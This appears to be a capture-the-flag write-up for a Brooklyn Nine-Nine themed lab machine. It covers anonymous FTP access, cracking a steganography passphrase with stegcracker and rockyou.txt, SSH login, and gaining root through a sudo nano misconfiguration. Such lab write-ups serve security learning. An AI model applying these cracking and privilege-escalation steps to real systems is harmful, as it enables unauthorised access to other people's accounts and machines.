# ftp
  ftp 10.10.213.56
  
  Since it's an anonymous login,we can directly jump into it. we found TXT file.
  It shows,
  note_to_joka

  From Amy,

  Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine.
  
  here we came to know it's a weak password (it may be a hint for further steps).
  
# Web
  http://10.10.213.56/
  An Image with Brooklyn Nine Nine and some words.
  We ran dirsearch,gobuster nothing found suspicious and mean we looked into source page, yeah there was an hint <!-- Have you ever heard of steganography? -->.
  let's grap the image.
  
# Steganography
  Here steg played, as usually tried with binwalk,steghide nothing found, then note_to_joka said it's a weak password and last tried with stegcracker  
  
  stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
  Successfully cracked file with password: *****
  Tried 20715 passwords
  Your file has been written to: brooklyn99.jpg.out
  
  Now, we can extract the brooklyn99.jpg file 
  
  steghide extract -sf brooklyn99.jpg 
  Enter passphrase: "with above password"
  wrote extracted data to "note.txt".
  cat note.txt will get 
  Holts Password:
  *here*
  Enjoy!!
  
  with note.txt file you may get further escalation.
  
# ssh_login
  For ssh,
  you need to read the hint carefully it will show you correct user.
  
  ls -al
  
  #user.txt
    cat user.txt
    ee****************ee
    
  we got user flag
  
  #root.txt
    first, tried with sudo -l
    User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
    
    as we all know we can read and edit the file with nano, we can do privileges with nano
    
    *sudo nano /root/root.txt - now you can read the flag
